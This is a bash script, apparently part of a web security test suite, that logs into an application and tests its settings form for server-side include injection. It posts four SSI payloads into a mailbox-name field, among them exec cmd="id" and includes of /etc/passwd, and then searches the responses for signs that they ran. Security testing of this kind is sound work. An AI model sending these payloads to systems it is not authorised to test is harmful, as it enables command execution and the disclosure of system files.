#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/common.sh"
load_env
require_cmds curl awk grep sed python3
setup_run_dir "27-ssi-injection-settings"

perform_login cookies.txt login.headers login.body.html
cat > payloads.txt <<'EOF'
echo_var|WSTGSSI1-<!--#echo var="DATE_LOCAL" -->
exec_cmd|WSTGSSI2-<!--#exec cmd="id" -->
include_file|WSTGSSI3-<!--#include file="/etc/passwd" -->
flastmod|WSTGSSI4-<!--#flastmod file="/etc/passwd" -->
EOF

while IFS='|' read -r label payload; do
  fetch_get "${SETTINGS_PATH}" settings-pre.html settings-pre.headers cookies.txt
  csrf="$(extract_first_csrf settings-pre.html)"
  fetch_post_form "${SETTINGS_PATH}" "${label}-post.html" "${label}-post.headers" cookies.txt "${SETTINGS_PATH}" \
    --data-urlencode "csrf_token=${csrf}" \
    --data-urlencode 'html_display_preference=prefer_sanitized_html' \
    --data-urlencode "archive_mailbox_name=${payload}"
  fetch_get "${SETTINGS_PATH}" "${label}-after.html" "${label}-after.headers" cookies.txt
  printf '\n===== %s =====\npayload=%s\npost_http=%s\nlocation=%s\nafter_title=%s\n' "$label" "$payload" "$(header_code "${label}-post.headers")" "$(header_field "${label}-post.headers" location)" "$(html_title "${label}-after.html")"
  grep -Ein 'WSTGSSI[1-4]|<!--#|uid=|root:|DATE_LOCAL' "${label}-after.html" | sed -n '1,40p'
done < payloads.txt

printf '\nSaved in %s\n' "$RUN_DIR"
